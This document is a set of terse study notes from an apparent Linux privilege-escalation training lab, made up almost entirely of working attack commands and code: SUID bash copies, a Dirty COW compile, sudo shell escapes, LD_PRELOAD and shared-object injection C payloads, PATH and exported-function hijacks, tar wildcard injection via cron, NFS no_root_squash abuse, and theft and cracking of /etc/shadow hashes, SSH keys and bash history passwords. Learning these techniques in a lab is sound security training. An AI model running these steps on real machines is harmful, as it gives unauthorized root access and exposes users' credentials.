https://github.com/sagishahar/lpeworkshop
http://udemy.com/course/linux-privilege-escalation-for-beginners
https://github.com/mzet-/linux-exploit-suggester


if can create suid file through cron job or python or whatever can use:

cp /bin/bash /tmp/bash && chmod +s /tmp/bash 

then run with /tmp/bash -p 


check config files for passwords and username
check bash_history for passwords and usernames entered
check file permissions
check for ssh keys

#######################################################################

run linux-exploit-suggester.sh
vulnerable to dirty cow
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
check sudo

#######################################################################

cat ~/.bash_history | grep -i passw

#######################################################################

ls -la /etc/shadow : check file permissions for shadow
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt

#######################################################################

find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

chmod 400 id_rsa
ssh -i id_rsa root@<ip>

#######################################################################
(shell escaping)
1. In command prompt type: sudo -l
2. From the output, notice the list of programs that can run via sudo.

1. In command prompt type any of the following:
a. sudo find /bin -name nano -exec /bin/sh \;
b. sudo awk 'BEGIN {system("/bin/sh")}'
c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
d. sudo vim -c '!sh'

 Can also use GTFObins to find exploits for available sudo commands
 
######################################################################
(Abusing Intended Functionality)
type: sudo -l

1. In command prompt type:
sudo apache2 -f /etc/shadow
2. From the output, copy the root hash.

Attacker VM

1. Open command prompt and type:
echo '[Pasted Root Hash]' > hash.txt
2. In command prompt type:
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
3. From the output, notice the cracked credentials.

######################################################################
(LD_PRELOAD)

type: sudo -l

1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id

######################################################################
(Shared Object Injection)

ype: find / -type f -perm -04000 -ls 2>/dev/null
note the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id

######################################################################
SUID(Symlinks)

type: dpkg -l | grep nginx
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

Exploitation

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is password123
3. Once escalated to root, in command prompt type: su -l www-data
4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: su root
2. The root password is password123
3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: id

######################################################################
SUID (Environment Variables #1)

type: find / -type f -perm -04000 -ls 2>/dev/null
note the SUID binaries.
type: strings /usr/local/bin/suid-env
notice the functions used by the binary.


1. In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
2. In command prompt type: gcc /tmp/service.c -o /tmp/service
3. In command prompt type: export PATH=/tmp:$PATH
4. In command prompt type: /usr/local/bin/suid-env
5. In command prompt type: id

######################################################################
SUID (Environment Variables #2)

type: find / -type f -perm -04000 -ls 2>/dev/null
note the SUID binaries.
type: strings /usr/local/bin/suid-env2
notice the functions used by the binary.

Exploitation Method #1

function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
type: /usr/local/bin/suid-env2

Exploitation Method #2

type: env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'

######################################################################
(capabilities)

type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

type: /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

######################################################################
(cron path)

type: cat /etc/crontab
notice the value of the “PATH” variable.

type: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
wait 1 min
/tmp/bash -p

######################################################################
(cron wildcards)

type: cat /etc/crontab
notice the script “/usr/local/bin/compress.sh”
type: cat /usr/local/bin/compress.sh
notice the wildcard (*) used by ‘tar’.

Exploitation

Linux VM

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
wait 1 min
/tmp/bash -p

######################################################################
Cron (File Overwrite)

1. In command prompt type: cat /etc/crontab
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
notice the file permissions.

1. In command prompt type:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: /tmp/bash -p
4. In command prompt type: id


######################################################################
(NFS Root Squashing)


1. In command line type: cat /etc/exports
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

1. Open command prompt and type: showmount -e 10.10.46.44
2. In command prompt type: mkdir /tmp/1
3. In command prompt type: mount -o rw,vers=2 10.10.46.44:/tmp /tmp/1
In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
5. In command prompt type: chmod +s /tmp/1/x

Linux VM

1. In command prompt type: /tmp/x
2. In command prompt type: id
